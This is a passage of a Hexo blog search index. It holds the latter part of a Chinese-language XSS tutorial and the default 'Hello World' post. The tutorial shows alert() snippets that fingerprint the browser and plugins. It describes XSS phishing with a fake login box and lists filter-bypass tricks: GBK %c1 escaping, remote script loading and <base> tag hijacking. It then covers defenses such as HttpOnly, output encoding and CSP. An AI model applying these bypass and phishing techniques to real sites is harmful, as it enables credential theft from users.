class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); <br><span class="hljs-title function_">alert</span>(jsCode);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><ol start="6"><li>收集用户信息（除了cookie以外）</li></ol><p>识别浏览器：最直接的方法就是读取浏览器的userAgent对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">userAgent</span>);<br></code></pre></td></tr></table></figure><p>可以得到操作系统版本，浏览器版本等等主机信息。<br>但是userAgent是可以被伪造的，有一些firefox的插件可以伪造虚假的userAgent。此时我们可以利用不同浏览器之间的细微差异来辨别不同的浏览器。</p><p>识别用户安装的软件（浏览器插件）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">alert</span>(navigator.<span class="hljs-property">plugins</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br></code></pre></td></tr></table></figure><p>获取用户的用户IP地址：<br>如果用户安装的JRE环境，就可以通过调用JavaApplet接口获取本地IP地址，也可以获取外网IP地址。</p><p>XSS钓鱼：利用js在当前页面上画出一个登录框，诱导用户去输入正确的凭据，然后发送至黑客的服务器上。</p><ol start="7"><li>Payload构造技巧：</li></ol><p>利用字符编码：对于使用GBK&#x2F;GB2312编码的字符，可以使用<code>%c1</code>绕过对双引号的转义。因为<code>%c1\</code> 会被解析成为一个unicode字符。</p><p>绕过长度限制：调用远程js文件；如果有两处XSS的话，可以使用注释符打通两个input框。</p><p>利用相对路径：使用 <code>&lt;base&gt;</code> 标签，将使用相对路径的资源&#x2F;脚本进行劫持。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>HttpOnly方法</p><p>简单来说，就是服务器在返回cookie时，将cookie设置了HttpOnly标签，使得javascript代码无法读取cookie值。但是严格来说其实这个方法并不是防御XSS的，而是防御XSS漏洞发生后的利用过程。虽然此时javascript无法读取到cookie，但是还是可以向同源的网址用ajax请求来进行模拟POST&#x2F;GET过程。</p></li><li><p>输入检查</p><p>前端js检查：可以阻挡大部分误操作的正常用户，但是可以被绕过。<br>后端检查：特殊字符的过滤&#x2F;编码，敏感词黑名单。</p></li><li><p>输出检查</p><p>比如将标签 <code>&lt; &gt;</code> 转化成 <code>&amp;lt &amp;gt</code>；<br><code>&amp;</code> 转化为 <code>&amp;amp</code>；<br><code>&quot;</code> 转化为 <code>&amp;quot</code>；<br><code>&#39;</code> 转化为 <code>&amp;#x27</code>；</p></li><li><p>使用CSP(Content Security Policy)</p><p>服务器在返回的Header中可以指定只有带特定 <code>nonce</code> 的script代码块才可以被执行，或者指定域名的远程js代码才可以被执行。</p></li></ol><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ol><li>SEED Labs [<a href="https://seedsecuritylabs.org]">https://seedsecuritylabs.org]</a>.</li><li>Web Security: A white hat perspective, Hanqing Wu.</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/15/hello-world/"/>
    <url>/2022/04/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
